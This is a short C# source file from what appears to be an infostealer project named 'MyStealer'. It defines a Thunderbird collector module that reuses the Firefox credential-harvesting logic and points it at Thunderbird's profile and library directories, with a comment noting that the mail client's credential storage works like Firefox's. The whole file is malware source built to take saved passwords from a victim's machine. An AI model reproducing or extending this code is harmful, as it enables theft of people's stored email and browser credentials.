using System.IO;
using System;

namespace MyStealer.Collector.Browser.FirefoxBased
{
    // Thunderbird is not a browser; it's an email client
    // but its credential storage is working in exactly same way with the firefox's one
    public class Thunderbird : Firefox
    {
        public override string ModuleName => "Thunderbird";

        protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Thunderbird", "Profiles");

        public override string[] LibDirectory => new string[] { "Mozilla Thunderbird" };
    }
}
